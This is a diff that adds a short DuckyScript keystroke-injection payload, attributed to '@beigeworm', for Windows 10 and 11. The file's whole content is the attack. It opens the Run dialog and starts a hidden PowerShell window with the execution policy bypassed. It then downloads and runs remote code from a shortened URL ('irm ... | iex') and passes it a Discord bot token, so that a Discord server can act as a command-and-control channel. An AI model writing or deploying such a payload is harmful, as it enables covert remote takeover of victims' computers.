@@ -1,0 +1,22 @@
+
+REM Title: beigeworm's Discord Command And Control.
+REM Author: @beigeworm
+REM Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
+REM Target: Windows 10 and 11
+
+REM SETUP
+REM make a discord bot at https://discord.com/developers/applications/
+REM add the bot to your discord server
+REM Change BOT_TOKEN below with your bot token
+REM for more info goto - https://github.com/beigeworm/PoshCord-C2
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex
+ENTER
+
